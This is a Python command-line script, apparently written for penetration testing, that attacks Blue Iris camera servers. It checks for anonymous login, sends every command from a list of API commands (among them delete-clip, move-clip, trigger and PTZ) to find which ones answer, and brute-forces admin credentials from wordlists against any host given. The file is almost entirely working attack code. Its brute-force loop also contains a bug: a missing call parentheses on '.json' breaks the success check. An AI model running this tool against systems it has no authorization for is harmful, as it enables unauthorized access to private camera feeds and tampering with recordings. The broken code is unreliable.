#!/usr/bin/python3

################################################################
#
# This script is designed for two main purpose - test BlueIris
# cameras for anonymous access, and brute force admin
# credentials. Blue Iris cameras have a very specific process
# for authenticating remotely, as outlined in their
# documentation (https://blueirissoftware.com/BlueIris.PDF).
# This script was created to automate that process. 
# 
# First, a random username and password is created to test
# anonymous access. If access is granted anonymously, then a
# simple endpoint enumerator is run and results are printed
# out. It's not super thorough, but goes through all the
# endpoints listed in documentation. Then, if username and
# password lists are provided, admin creds are brute forced. 
# 
# Information that can be disclosed include CPU and memory
# usage and capacity, disk usage and capacity, last BlueIris
# software update, number of connections, and server uptime.
# 
# Note - this was tested on BlueServer/4.8.6.3 running on
# Windows Server 2012 R2.
# 
# Examples:
#     python3 blueiris_scanner.py -H https://my.domain.com
#     python3 blueiris_scanner.py -H https://seconddomain.com
#          -u userfile.txt -p passwordfile.txt -v
#
# Use the command `python3 blueiris_scanner.py -h` for help.
# 
################################################################


### IMPORTS ###
import requests, json, time, hashlib, argparse, random


### INITIALIZATION ###
BRUTE_FORCE_ADMIN = True
ENUMERATE_ANON = False
usernames = []
passwords = []
anon_username = '%030x' % random.randrange(16**30)
anon_password = '%030x' % random.randrange(16**30)
headers = {
    "Content-Type": "application/json"
}
TIMEOUT = 4
DELAY = 0.1
CAM_NAME = "default_value"
commands = [
    {
        "name": "alertlist",
        "camera": True
    },
    {
        "name": "camconfig",
        "camera": True
    },
    {
        "name": "camset",
        "camera": True
    },
    {
        "name": "cliplist",
        "camera": True
    },
    {
        "name": "clipstats",
        "camera": False
    },
    {
        "name": "console",
        "camera": False
    },
    {
        "name": "delalert",
        "camera": False
    },
    {
        "name": "delclip",
        "camera": False
    },
    {
        "name": "devices",
        "camera": False
    },
    {
        "name": "export",
        "camera": False
    },
    {
        "name": "geofence",
        "camera": False
    },
    {
        "name": "log",
        "camera": False
    },
    {
        "name": "moveclip",
        "camera": False
    },
    {
        "name": "ptz",
        "camera": True
    },
    {
        "name": "status",
        "camera": False
    },
    {
        "name": "sysconfig",
        "camera": False
    },
    {
        "name": "timeline",
        "camera": True
    },
    {
        "name": "trigger",
        "camera": True
    },
    {
        "name": "update",
        "camera": False
    },
    {
        "name": "userconfig",
        "camera": False
    },
    {
        "name": "users",
        "camera": False
    },
]


### ARGUMENT PARSING ###
parser = argparse.ArgumentParser()
parser.add_argument('-H', "--host", type=str, required=True, help="Target host URL, example - https://domain.com")
parser.add_argument('-u', "--usernames", type=str, help="Path to text file of possible usernames")
parser.add_argument('-p', "--passwords", type=str, help="Path to text file of possible passwords")
parser.add_argument('-v', "--verbose", help="Verbose", action="store_true")
args = parser.parse_args()


# check to see if usernames and passwords are passed in
if args.usernames == None or args.passwords == None:
    print("[+] No paths to text file of usernames and passwords was passed in. Admin access will not be brute forced.\n")
    BRUTE_FORCE_ADMIN = False
# if provided, read in list of usernames and passwords
else:
    try:
        if args.verbose:
            print(f"  [+] Opening file '{args.usernames}' for a list of usernames...")
        usernames = open(args.usernames, "r").read().splitlines()
    except:
        print(f"[-] Error retrieving usernames list \"{args.usernames}\"")
        exit()
        
    try:
        if args.verbose:
            print(f"  [+] Opening file '{args.passwords}' for a list of passwords...")
        passwords = open(args.passwords, "r").read().splitlines()
    except:
        print(f"[-] Error retrieving passwords list \"{args.passwords}\"")
        exit()


### TEST ANONYMOUS ACCESS ###
print("[+] Testing anonymous access...")

if args.verbose:
    print(f"  [+] Using randomly-generated username {anon_username} and randomly-generated password {anon_password}")

try:
    # get session ID
    data = {"cmd":"login"}
    response = requests.request("POST", args.host+"/json", timeout=TIMEOUT, headers=headers, json=data).json()
except requests.exceptions.RequestException as e:
    print("[-] Error occured -",e)
    exit()

# send authentication request
sessionID = response["session"]
if args.verbose:
    print(f"  [+] Session id obtained: {sessionID}")
hash = (anon_username+":"+sessionID+":"+anon_password).encode("utf-8")
data = {"cmd":"login","session":sessionID,"response":hashlib.md5(hash).hexdigest()}
if args.verbose:
    print("  [+] POST data: "+json.dumps(data))
try:
    response = requests.request("POST", args.host+"/json", timeout=TIMEOUT, headers=headers, json=data).json()
except requests.exceptions.RequestException as e:
    print("[-] Error occured -",e)
    exit()

# success?
if response['result'] == "success":
    print("[+] SUCCESS! Anonymous access is permitted")
    print(json.dumps(response),"\n")
    ENUMERATE_ANON = True
else:
    print("[-] Anonymous access is not permitted")


### ENUMERATE ANONYMOUS ACCESS ###
if ENUMERATE_ANON:
    print("[+] Enumerating endpoints accessible with anonymous access...")

    # try to get list of cameras first
    try:
        data = {"cmd":"camlist","session":sessionID}
        response = requests.request("POST", args.host+"/json", timeout=TIMEOUT, headers=headers, json=data).json()
    except requests.exceptions.RequestException as e:
        print("[-] Error occured -",e)
        exit()

    if response['result']=="success":
        print("[+] Command 'camlist' returned successfully:")
        print(json.dumps(response))

        # parse camera names
        print("[+] A valid camera name will be used in some subsequent requests")
        CAM_NAME = response["data"][0]["optionValue"]
    elif args.verbose:
        print("  [-] Command 'camlist' failed. Without a valid camera name, some endpoints may not reply successfully")

    time.sleep(DELAY)

    # see what endpoints return successfully
    for command in commands:
        # create POST data
        data = {"cmd":command["name"],"session":sessionID}
        if command["camera"]:
            data["camera"] = CAM_NAME

        # send request
        try:
            response = requests.request("POST", args.host+"/json", timeout=TIMEOUT, headers=headers, json=data).json()
        except requests.exceptions.RequestException as e:
            print("[-] Error occured -",e)
            exit()

        # parse response
        if response['result']=="success":
            print(f"[+] Command '{command['name']}' returned successfully:")
            print(json.dumps(response))
        elif args.verbose:
            print(f"  [-] Command '{command['name']}' failed")

        time.sleep(DELAY)
    print("\n[+] For more details on the endpoint results, see https://blueirissoftware.com/BlueIris.PDF (starting page 226)\n")


### BRUTE FORCE ADMIN ACCESS ###
if BRUTE_FORCE_ADMIN:
    print("[+] Brute forcing admin credentials...")
    for username in usernames:
        print(f"[+] Attempting all passwords with username {username}")
        for password in passwords:
            try:
                # get session ID
                data = {"cmd":"login"}
                response = requests.request("POST", args.host+"/json", timeout=TIMEOUT, headers=headers, json=data).json()
            except requests.exceptions.RequestException as e:
                print("[-] Error occured -",e)
                exit()

            # send authentication request
            sessionID = response["session"]
            hash = (username+":"+sessionID+":"+password).encode("utf-8")
            data = {"cmd":"login","session":sessionID,"response":hashlib.md5(hash).hexdigest()}
            try:
                response = requests.request("POST", args.host+"/json", timeout=TIMEOUT, headers=headers, json=data).json
            except requests.exceptions.RequestException as e:
                print("[-] Error occured -",e)
                exit()

            if response['data']['admin'] == True:
                print(f"[+] SUCCESS! Username is {username} and password is {password}")
                if args.verbose:
                    print("[+] POST data was:")
                    print(json.dumps(data))
                exit()
            time.sleep(DELAY)

    print("[-] Brute forcing was unsuccessful")